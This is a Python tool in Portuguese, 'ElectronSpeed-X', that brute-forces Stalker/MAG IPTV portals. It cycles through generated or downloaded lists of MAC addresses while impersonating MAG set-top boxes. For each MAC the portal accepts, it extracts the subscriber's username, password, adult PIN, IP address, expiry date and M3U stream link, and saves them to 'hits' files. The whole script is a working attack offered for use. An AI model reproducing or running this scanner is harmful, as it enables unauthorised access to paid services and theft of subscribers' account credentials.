''' Se ocorrer um erro, vá em Configurações e ative o SL4A Service. '''
import os, requests, arrow, pathlib, platform, random, shutil, time, re, subprocess, androidhelper as sl4a
import io
import sys
import time
from tqdm import tqdm
ad = sl4a.Android()
os.system("cls" if os.name == "nt" else "clear")
oto, tur, say, bul, hit, cpm = 0, 0, 0, 0, 0, 1
Seri = ""
ESC = '\033['
RESET = ESC + '0m'
COR = lambda i: ESC + f'1;38;5;{i}m'
FUNDO = lambda i: ESC + f'1;48;5;{i}m'
def colors(index: int) -> str:
	return f"\33[1;38;5;{index}m"
def get_color_number() -> int:
	return int(time.time()) % 256
color_number = get_color_number()
color_code = colors(color_number)
def texto_centralizado(texto):
	try:
		terminal_width = shutil.get_terminal_size().columns
	except OSError:
		terminal_width = 80
	return f"{texto:^{terminal_width}}"
os.system("cls" if os.name == "nt" else "clear")
rootDir, my_os = ("./", "Wɪɴᴅᴏᴡs") if platform.system() == "Windows" else ("/sdcard/", "Aɴᴅʀᴏɪᴅ")
sounds_dir = os.path.join(rootDir, "Sounds"); os.makedirs(sounds_dir, exist_ok=True)
combo_dir = os.path.join(rootDir, "combo/"); os.makedirs(combo_dir, exist_ok=True)
hits_dir = os.path.join(rootDir, "Hits", "ᴇʟᴇᴄᴛʀᴏɴsᴘᴇᴇᴅ-x sᴄᴀɴɴɪɴɢ ᴍᴀᴄs"); os.makedirs(hits_dir, exist_ok=True)
hitscombo_dir = os.path.join(hits_dir, "ᴄᴏᴍʙᴏ ᴍᴀᴄs"); os.makedirs(hitscombo_dir, exist_ok=True)
print(texto_centralizado(f"{COR(215)}⧳━─⩥⟬ {my_os} ⟭⩤─━⧳"))
time.sleep(1.5)
def cronometrar_tempo():
    global tempo_inicio
    if 'tempo_inicio' not in globals():
        tempo_inicio = time.time()
    tempo_decorrido = int(time.time() - tempo_inicio)
    dias, resto = divmod(tempo_decorrido, 86400)
    horas, resto = divmod(resto, 3600)
    minutos, segundos = divmod(resto, 60)
    return ':'.join(f"{v:02}{u}" for v, u in zip([dias, horas, minutos, segundos], "dhms") if v or u == 's')
def rename_terminal_session():
	if os.name == 'posix':
		os.system('echo -ne "\033]0;ElectronSpeed-X Scanning MAC\007"')
	elif os.name == 'nt':
		os.system('title ElectronSpeed-X Scanning MAC')
rename_terminal_session()
timestr = time.strftime("%d-%m-%Y")
time_= time.localtime()
current_time = time.strftime("%d/%m/%Y - %H:%M:%S", time_)
hora_ini = time.strftime("%d/%m/%Y - %H:%M:%S", time_)
unique_urls_paths = {
	"http://codeskulptor-demos.commondatastorage.googleapis.com/pang/arrow.mp3": os.path.join(sounds_dir, "Arrow.mp3"),
	"http://soundfxcenter.com/video-games/call-of-duty/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3": os.path.join(sounds_dir, "8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3"),
	"http://soundfxcenter.com/video-games/galaga/8d82b5_Galaga_Firing_Sound_Effect.mp3": os.path.join(sounds_dir, "8d82b5_Galaga_Firing_Sound_Effect.mp3"),
	"http://soundfxcenter.com/video-games/super-mario-bros/8d82b5_Super_Mario_Bros_1_Up_Sound_Effect.mp3": os.path.join(sounds_dir, "8d82b5_Super_Mario_Bros_1_Up_Sound_Effect.mp3"),
	"http://topbgtv.free.bg/FIKO_DIRECTORY/STBMAX5.mp3": os.path.join(sounds_dir, "STBMAX5.mp3"),
	"https://topbgtv.free.bg/FIKO_DIRECTORY/STBMAX3.mp3": os.path.join(sounds_dir, "STBMAX3.mp3"),
	"https://drive.google.com/uc?export=download&id=1xc0qd3q8COpZGotHN9vIKNq_M3i7vW2x": os.path.join(combo_dir, "COMBO_Online_1.txt"),
	"https://drive.google.com/uc?export=download&id=1xPeQN0bTT7et5-q66Nj7pwVSUJyRxd7N": os.path.join(combo_dir, "COMBO_Online_2.txt"),
	"https://drive.google.com/uc?export=download&id=1xMtqxXlhrZyxBnrVpEiliyDC6oS0sD0R": os.path.join(combo_dir, "COMBO_Online_3.txt"),
}
for filename in unique_urls_paths.values():
	os.system("cls" if os.name == "nt" else "clear")
	print(texto_centralizado(f"{COR(215)}⧳━─⩥⟬ {filename} ⟭⩤─━⧳"))
	time.sleep(1.5)
	os.system("cls" if os.name == "nt" else "clear")
ses= requests.Session()
macSayisi=1048576
ElectronSpeedX = (f"""
\n{COR(16)}{FUNDO(15)}      ★      ★      ★      ★      ★      ★       ★      ★      ★            {RESET}\33[1;38;5;3m\n
	╔═══╦╗──────╔╗─────────╔═══╗──────────╔╗─╔═╗╔═╗               \33[1;38;5;3m
	║╔══╣║─────╔╝╚╗────────║╔═╗║──────────║║─╚╗╚╝╔╝               \33[1;38;5;3m
	║╚══╣║╔══╦═╩╗╔╬═╦══╦═╗─║╚══╦══╦══╦══╦═╝║──╚╗╔╝               \33[1;38;5;3m
	║╔══╣║║║═╣╔═╣║║╔╣╔╗║╔╗╗╚══╗║╔╗║║═╣║═╣╔╗╠══╦╝╚╗               \33[1;38;5;3m
	║╚══╣╚╣║═╣╚═╣╚╣║║╚╝║║║║║╚═╝║╚╝║║═╣║═╣╚╝╠═╦╝╔╗╚╗               \33[1;38;5;3m
	╚═══╩═╩══╩══╩═╩╝╚══╩╝╚╝╚═══╣╔═╩══╩══╩══╝─╚═╝╚═╝               \33[1;38;5;3m
	───────────────────────────║║─by Josiel Jefferson               \33[1;38;5;3m
	───────────────────────────╚╝────Chemistry Remake               \33[1;38;5;2m
	               ___                      ___
	              (o o)                    (o o)
	             (  V  ) Josiel Jefferson (  V  )
	             --m-m----------------------m-m--
                       𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏             \33[1;0m
\n{COR(16)}{FUNDO(15)}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ       \n{RESET}""")
print(ElectronSpeedX)
ozelmac=""
panel = input("\nDigite o nome do Painel:Porta \n(Exemplo: josieljefferson.com:8080): ")
combo = input("""
	Selecione o tipo de varredura..!
1=⫸Com combo
2=⫸Automático sem combo
Resposta=⫸ """).strip() or '1'
combo = '1' if combo != '2' else combo
os.system("cls" if os.name == "nt" else "clear")
totLen="000000"
if combo=="1":
	say=0
	dsy=""
	dir = combo_dir
	for files in os.listdir (dir):
		say=say+1
		dsy = dsy + " \33[0;1m╠⚛︎  \33[1;38;5;215m[ \33[1;96m" + str(say) + " \33[1;38;5;215m] \33[1;92m" + files + '\n'
	print ("""Selecione seu combo na lista abaixo!!!
 ╔════════════════════════════════════════☣                \33[0;1m
"""+dsy+"""\33[0;1m ╚════════════════════════════════════════☣                \33[0;1m
\33[33mForam encontradas """ +str(say)+""" arquivos na pasta de combos!
	""")
	dsyno = str(input(" \33[31mNúmero do Combo =\33[0m"))
	say=0
	for files in os.listdir (dir):
			say=say+1
			if dsyno==str(say):
				dosyaa=(dir+files)
	say=0
	print(dosyaa)
	c=open(dosyaa, 'r')
	totLen=c.readlines()
	os.system("cls" if os.name == "nt" else "clear")
	baslama=""
	baslama = input("""
No arquivo de combo selecionado, \33[1;31;43m""" + str(len(totLen)) + """\33[0;40m endereços MAC foram previstos.
Se deseja alterar a ordem de início da varredura no combo:
Sim  =⫸ Digite o número da linha.
Não  =⫸ Apenas pressione Enter.
		Resposta=""")
	if not baslama =="":
		baslama=int(baslama)
		csay=baslama
os.system("cls" if os.name == "nt" else "clear")
if combo=="1":
	print("\n\nPara continuar a varredura quando os endereços MAC do seu combo forem insuficientes")
macyazi = ("""
\33[1mSelecione o tipo de combinação de MAC...?\33[0m
\33[33mPara MACs sequenciais crescentes =⫸ \33[31m1
\33[33mPara MACs aleatórios =⫸ \33[31m2
\33[0m\33[1mTipo de Combinação de MAC=⫸\33[31m""")
macturu=input(macyazi)
if macturu=="":
	macturu="2"
MacCombo="00:1A:79:"
Macs = input("""\33[0m
Digite 5 para testar um MAC ativo...
Digite 0 para alterar o tipo de MAC...
\33[33mDeseja usar MACs sequenciais?
\33[1m\33[34mSim (1) \33[0m ou \33[1m\33[32mNão (2) \33[0m Digite sua resposta!!
Resposta=""")
if Macs=="5":
	macSayisi=1
	ozelmac = input("MAC específico ativo = ")
dmac=""
if  Macs=="0":
	dmac = input("""
Tipo de MAC padrão
	1 = 00:1A:79:
	2 = 18:C8:E7:
	3 = Vou definir manualmente...
	Escolha uma opção: """)
	if dmac=="1":
		MacCombo="00:1A:79:"
		Macs = input("\33[0m\nDeseja usar MACs sequenciais? \nResposta \33[1m\33[34mSim (1) \33[0m ou \33[1m\33[32mNão (2) \33[0m Digite sua escolha!! = ")
	if dmac=="2":
		MacCombo="18:C8:E7:"
		Macs = input("\33[0m\nDeseja usar MACs sequenciais? \nResposta \33[1m\33[34mSim (1) \33[0m ou \33[1m\33[32mNão (2) \33[0m Digite sua escolha!! = ")
	if dmac=="3":
		MacCombo = input("Digite os três primeiros octetos do MAC... ")
		Macs = input("\33[0m\nDeseja usar MACs sequenciais? \nResposta \33[1m\33[34mSim (1) \33[0m ou \33[1m\33[32mNão (2) \33[0m Digite sua escolha!! = ")
if Macs[:1]=="e" or Macs[:1]=="E" or Macs=="1" or Macs=="" or Macs[:1]=="S" or Macs[:1]=="s":
	Seri = input("Exemplo=" + MacCombo + "\33[31m5\33[0m\nExemplo=" + MacCombo + "\33[31mFa\33[32m\nDigite um ou dois valores!!!\33[0m\n\33[1m" + MacCombo + "\33[31m")
os.system("cls" if os.name == "nt" else "clear")
Rhit='\33[33m'
Ehit='\033[0m'
panel = panel.replace("http://", "").replace("/c", "").replace("/", "")
tkn1 = tkn2 = tkn3 = tkn4 = tkn5 = pro1 = pro2 = pro3 = trh1 = trh2 = trh3 = "a"
acount_id="bbb"
a="0123456789ABCDEF"
s, ss, sss, ssss, sd, sdd = -1, 0, 0, 0, 0, 0
def yaz(hits):
	caminho = os.path.join(hits_dir, f"mac@{panel.replace(':', '_').replace('http://', '').replace('/c/', '')}][{timestr}][ᴇʟᴇᴄᴛʀᴏɴsᴘᴇᴇᴅ-x][ʜɪᴛs].txt")
	os.makedirs(os.path.dirname(caminho), exist_ok=True)
	with open(caminho, "a+", encoding="utf-8") as dosya:
		dosya.write(hits + "\n\n")
def yax(mac):
	caminho = os.path.join(hitscombo_dir, f"{panel.replace(':', '_').replace('/', '')}][{timestr}][ᴇʟᴇᴄᴛʀᴏɴsᴘᴇᴇᴅ-x][ᴄᴏᴍʙᴏ].txt")
	os.makedirs(os.path.dirname(caminho), exist_ok=True)
	with open(caminho, "a+", encoding="utf-8") as dosya:
		dosya.write(mac + "\n")
def yaxx(mac):
	caminho = os.path.join(hitscombo_dir, f"[ᴇʟᴇᴄᴛʀᴏɴsᴘᴇᴇᴅ-x sᴄᴀɴɴɪɴɢ ᴍᴀᴄ][ᴍᴀᴄs].txt")
	os.makedirs(os.path.dirname(caminho), exist_ok=True)
	with open(caminho, "a+", encoding="utf-8") as dosya:
		dosya.write(mac + "\n")
os.system("cls" if os.name == "nt" else "clear")
print(ElectronSpeedX)
macaddres=MacCombo
s = ss = sss = ssss = sd = sdd = csay = 0
a = "0123456789ABCDEF"
pattern = r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}"
for mag in range(16**4):
	oto=""
	macr=""
	tur=0
	hex_num = hex(mag)[2:].zfill(6)
	genmac = MacCombo+"%02X:%02X:%02X"% (random.randint(0, 256),random.randint(0, 256),random.randint(0, 256))
	genmac=genmac.replace(':100',':10')
	if len(Seri) ==1:
	   genmac=str(genmac).replace(str(genmac[:10]),macaddres+Seri)
	if len(Seri)==2:
	   genmac=str(genmac).replace(str(genmac[:11]),macaddres+Seri)
	macr=(genmac)
	ss += 1
	if s ==16:
		ss += 1
		s = 0
	if ss ==16:
		sss += 1
		ss = s = 0
	if sss==16:
		ssss += 1
		sss = ss = s = 0
	if ssss==16:
		sd += 1
		ssss = sss = ss = s = 0
	if sd==16:
		sdd += 1
		sd = sss = ss = s = 0
	if sdd==16:
		sdd = sd = sss = ss = s = 0
	seri1=a[sdd]
	seri2=a[sd]
	if not Seri=="":
		if len(Seri)==1:
			seri1=Seri[0]
		if len(Seri)==2:
			seri1=Seri[0]
			seri2=Seri[1]
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	if macturu =="1":
		mac=mac=MacCombo+maca
	else:
		mac=macr
	combo=combo
	if combo=="1":
		if len(totLen)-2 > csay:
			while True:
			     csay=csay+1
			     if csay > len(totLen)-1 :
			     	break
			     macv =re.search(pattern,totLen[csay],re.IGNORECASE)
			     if macv:
			     	mac=macv.group()
			     	if not dmac=="":
			     		mac=mac.upper()
			     		mac=mac.replace('00:1A:79',MacCombo)
			     	break
	if not ozelmac=="":
		mac=ozelmac
	macs = mac.replace("::", ":").replace(" ", "").replace("::", ":").replace(" ", "").replace(":", "%3A")
	'''mac_total = len(totLen) if combo == "1" else 16**4'''
	mac_total = len(totLen) if combo == "1" else 0
	mac_total += 16**4
	veri="ElectronSpeedX"
	HEADERA={
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
"Pragma": "no-cache",
"Accept": "*/*",
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FIstanbul; adid=91b4a5f6dfb347d871ac2b624696917f",
"Agent": "Model: mag250",
"Host": panel,
	}
	HEADERB={
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
"Pragma": "no-cache",
"Accept": "*/*",
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FIstanbul; adid=91b4a5f6dfb347d871ac2b624696917f",
"Agent": "Model: mag250",
"Referer": "http://"+panel+"/c/",
	}
	if tkn2=="a":
                try:
                        url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=&prehash=0&JsHttpRequest=1-xml"
                        res = ses.get(url1, headers=HEADERA, timeout=15, verify=False)
                        veri="veri"
                        veri=str(res.text)
                        if veri.count("token")==0:
                        	tkn2="b"
                except:pass
	if tkn3=="a":
                if veri.count("token")==0:
                	try:
                        	url1="http://"+panel+"/server/load.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                        	res = ses.get(url1, headers=HEADERB, timeout=15, verify=False)
                        	veri="veri"
                        	veri=str(res.text)
                        	if veri.count("token")==0:
                        	 	tkn3="b"
                	except:pass
	if tkn4=="a":
                if veri.count("token")==0:
                	try:
                        	url1="http://"+panel+"/load.php?type=stb&action=get_modules&JsHttpRequest=1-xml"
                        	res = ses.get(url1, headers=HEADERB, timeout=15, verify=False)
                        	veri="veri"
                        	veri=str(res.text)
                        	if veri.count("token")==0:
                        	 	tkn4="b"
                	except:pass
	ElectronSpeedX = "ElectronSpeedX"
	ElectronSpeedX=veri[:1]
	token=veri.replace('{"js":{"token":"',"")
	token=token.replace('"}}',"")
	say += 1
	cpm=(time.time()-cpm)
	cpm=(round(60/cpm))
	def colors(index: int) -> str:
		return f"\33[1;38;5;{index}m"
	def get_color_number() -> int:
		return int(time.time()) % 256
	color_number = get_color_number()
	color_code = colors(color_number)
	def show_loading_bar(progresso, atual, total, cronometro):
		bar_length = 20
		num_blocks = int(progresso / (100 / bar_length))
		bar = "❚" * num_blocks + "-" * (bar_length - num_blocks)
		return f"\r╠☞ Progresso ☛ [{atual}/{total}] ⟬{bar}⟭[{progresso:.2f}%] - [{cronometro}]"
	progresso = (say / mac_total) * 100
	scanner = f"""
╔══════════════════════════════════════════════════════════════╗            
╠☞               ___                      ___
╠☞              (o o)                    (o o)
╠☞             (  V  ) Josiel Jefferson (  V  )
╠☞             --m-m----------------------m-m--
╠☞        𝑴𝒖𝒍𝒕𝒊-𝑻𝒉𝒓𝒆𝒂𝒅 𝑺𝒆𝒓𝒗𝒆𝒓𝒔 𝑺𝒄𝒂𝒏𝒏𝒆𝒓 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏
╠☞
╠☞ Host ☛ {panel} 
╠☞ MAC ☛ {mac} \n{show_loading_bar(progresso, say, mac_total, cronometrar_tempo())} 
╠☞ Hits ☛ {hit} CPM ☛ {cpm}        
╚══════════════════════════════════════════════════════════════╝            
\n{color_number}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ        {color_number}\n"""
	echo = (f"\33[{color_code}{scanner} {RESET}")
	print(texto_centralizado(echo))
	cpm=time.time()
	HEADERd={
"Host": panel,
"Connection": "keep-alive",
"Accept": "*/*",
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
"Referer": "http://"+panel+"/c/",
"Accept-Language": "en-US,*",
"Accept-Charset": "UTF-8,*;q=0.8",
"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
"Authorization": "Bearer "+token,
	}
	if pro1=="a":
                        url2="http://"+panel+"/portal.php?type=stb&action=get_profile"
                        try:
                        	res = ses.get(url2, headers=HEADERd, timeout=15, verify=False)
                        	veri=str(res.text)
                        	ElectronSpeedX = "ElectronSpeedX"
                        	ElectronSpeedX=veri[:1]
                        except:pass
	adult="b"
	ip=""
	try:
		adult = veri.split('parent_password":"')[1].split('"')[0]
		play_token = veri.split('play_token":"')[1].split('"')[0]
		acount_id = veri.split('name":"')[1].split('"')[0]
		stb_id = veri.split('id":"')[1].split('"')[0]
		ip = veri.split('ip":"')[1].split('"')[0]
	except:pass
	HEADERd={
"Host": panel,
"Connection": "keep-alive",
"Accept": "*/*",
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
"Referer": "http://"+panel+"/c/",
"Accept-Language": "en-US,*",
"Accept-Charset": "UTF-8,*;q=0.8",
"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
"Authorization": "Bearer "+token,
"Accept-Encoding": "gzip, deflate",
	}
	if trh1=="a":
                try:
                        url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                        res = ses.get(url3, headers=HEADERd, timeout=15, verify=False)
                        veri=str(res.text)
                except:pass
                try:
                        url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac="+mac
                        res = ses.get(url3, headers=HEADERd, timeout=15, verify=False)
                        veri=str(res.text)
                except:pass
	ElectronSpeedX = "ElectronSpeedX"
	ElectronSpeedX=veri[:1]
	if ElectronSpeedX=="{" :
	   hit += 1
	   sound_files = ["8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect", "8d82b5_Galaga_Firing_Sound_Effect", "8d82b5_Super_Mario_Bros_1_Up_Sound_Effect", "STBMAX5", "STBMAX3", "Arrow"]
	   sound_file = random.choice(sound_files)
	   print(texto_centralizado(f"{COR(215)}⧳━─⩥⟬ {sound_file} ⟭⩤─━⧳"))
	   time.sleep(00.1)
	   sound = os.path.join(sounds_dir, f"{sound_file}.mp3")
	   file = pathlib.Path(sound)
	   if file.exists ():
	   	ad.mediaPlay(sound)
	   try:
	   	trh = veri.split('phone":"')[1].replace('"}}', "")
	   except:
	   	trh = "<EXP>"
	   url5="http://"+panel+"/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
	   kategori="hata"
	   res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   veri=str(res.text)
	   for i in veri.split('title":"'):
	   	kanal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/', '/')
	   	kategori += kanal + " ⚇ "
	   try:
	   	kategori = kategori.split("*")[1].replace("\/", "/")
	   except:pass
	   real=panel
	   url5="http://"+real+"/portal.php?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	   userm = pasdm = ""
	   try:
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	veri=veri.replace('live\/', '')
	   	real=veri.split('\/')[2]
	   	userm=veri.split('\/')[3]
	   	pasdm=veri.split(userm+'\/')[1]
	   	pasdm=pasdm.split('\/')[0]
	   except:pass
	   try:
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	kanalsayisi=str(veri.count("stream_id"))
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	filmsayisi=str(veri.count("stream_id"))
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	dizisayisi=str(veri.count("series_id"))
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	status = "Status ➤ " + veri.split('status":')[1].split(',')[0].replace('"', "").replace("Active", "Ativo")
	   	timezone = "Fuso horário ➤ " + veri.split('timezone":"')[1].split('",')[0].replace("\/", "/")
	   	realm = "Real ➤ http://" + veri.split('url":')[1].split(',')[0].replace('"', "")
	   	portal = panel
	   	portal = "Portal ➤ http://" + panel + "/c/"
	   	port = veri.split('port":')[1].split(',')[0].replace('"', '') if 'port":"' in veri else "Desconhecido"
	   	user = "Usuário ➤ " + (veri.split('username":')[1].split(',')[0].replace('"', '') if 'username":"' in veri else "Desconhecido")
	   	passw = "Senha ➤ " + (veri.split('password":')[1].split(',')[0].replace('"', '') if 'password":"' in veri else "Desconhecido")
	   	created = veri.split('created_at":')[1].split(',')[0].replace('"', '')
	   	bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', "")
	   	if bitis == "null" or bitis == "❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃":
	   		bitis = '❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃'
	   	else:
	   		try:
	   			bitis_date = arrow.get(int(bitis))
	   		except ValueError:
	   			bitis_date = arrow.get(bitis, "DD-MM-YYYY HH:mm:ss")
	   		today = arrow.now()
	   		days_left = abs((bitis_date - today).days)
	   		bitis = f'{bitis_date.format("dddd, D [de] MMMM [de] YYYY, HH:mm:ss", locale="pt_BR")} ({days_left} dias)'.lower()
	   		bitis = "Expira em ➤ " + bitis
	   		trh = "Expira ➤ " + bitis.replace("Expira em ➤ ", "").replace("Unlimited ", "❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃")
	   	if created == "null":
	   		created = "├─●🔸📆 Data de criação ➤ ❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃"
	   	else:
	   		created_date = arrow.get(int(created))
	   		created = created_date.format("dddd, D [de] MMMM [de] YYYY, HH:mm:ss", locale="pt_BR").lower()
	   		created = "Criado em ➤ " + created
	   	acon = "A][" + (veri.split('active_cons":')[1].split(',')[0].replace('"', '') if 'active_cons":"' in veri else "Desconhecido")
	   	mcon = "M][" + (veri.split('max_connections":')[1].split(',')[0].replace('"', '') if 'max_connections":"' in veri else "Desconhecido")
	   except:
	   	realm="pass"
	   mlink = f"URL M3U ➤ http://{panel}/get.php?username={userm}&password={pasdm}&type=m3u_plus"
	   imzaa = imzab = categorias_ptbr = ""
	   palavras_chave_br = ["|🇧🇷", "BR|", "BRASIL", "BRAZIL", "Brasil", "Brazil", "[CH] BR - ABERTOS", "BRAZİL"]
	   palavras_chave_pt = ["|🇵🇹", "PT|", "PORTUGAL", "Portugal", "|🇵🇹 PT", "🇵🇹 PT", "[PT]", "PT|"]
	   kategori_upper = kategori.upper()
	   br_detectado = any(keyword.upper() in kategori_upper for keyword in palavras_chave_br)
	   pt_detectado = any(keyword.upper() in kategori_upper for keyword in palavras_chave_pt)
	   categorias_ptbr += f"[𝔹ℝ ➤ {'Sim! 🇧🇷' if br_detectado else 'Não'}]"
	   categorias_ptbr += f" - [ℙ𝕋 ➤ {'Sim! 🇵🇹' if pt_detectado else 'Não'}]"
	   imza1 = ("""╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐💡 𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏 💡
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐Painel ➤ http://""" + panel + """/c/
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐Real ➤ http://""" + real + """/c/
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐Mac ➤ """ + mac + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + trh.replace('Unlimited', 'Expira ➤ ❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃') + """
╰───────────────╮⚇╭───────────────╯""")
	   if acount_id != "bbb":
	   	imzaa = ("""
╭───────────────╯⚇╰───────────────╮
├╾⟐ID da Conta ➤ """ + acount_id + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐ID do STB ➤ """ + stb_id + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐Senha Adulta ➤ """ + adult + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐IP ➤ """ + ip + """
╰───────────────╮⚇╭───────────────╯""")
	   imza2=""
	   if realm != "pass":
	   	imza2 = ("""
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + user + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + passw + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + created + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + bitis.replace('❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃', 'Expira ➤ ❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃') + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐Conexões ➤ [""" + acon + """] - [""" + mcon + """]
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + status + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + timezone + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐[📺][""" + kanalsayisi + """] - [🍿][""" + filmsayisi + """] - [🎬][""" + dizisayisi + """]
╰───────────────╮⚇╭───────────────╯""")
	   imza3 = ("""
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + mlink + """
╰───────────────╮⚇╭───────────────╯""")
	   if kategori != "hata":
	   	imzab = ("""
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + categorias_ptbr + """
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮
├╾⟐""" + kategori.replace('hata{ ⚇ All ', 'All ') + """
╰───────────────╮⚇╭───────────────╯""")
	   imzas=("""
╭───────────────╯⚇╰───────────────╮
├╾⟐ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ʙʏ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ
╰───────────────╮⚇╭───────────────╯
╭───────────────╯⚇╰───────────────╮""")
	   imza = "".join([imza1, imzaa, imza2, imza3, imzab, imzas])
	   yaz(imza+'\n')
	   yax(mac)
	   yaxx(mac)
	   print(imza)
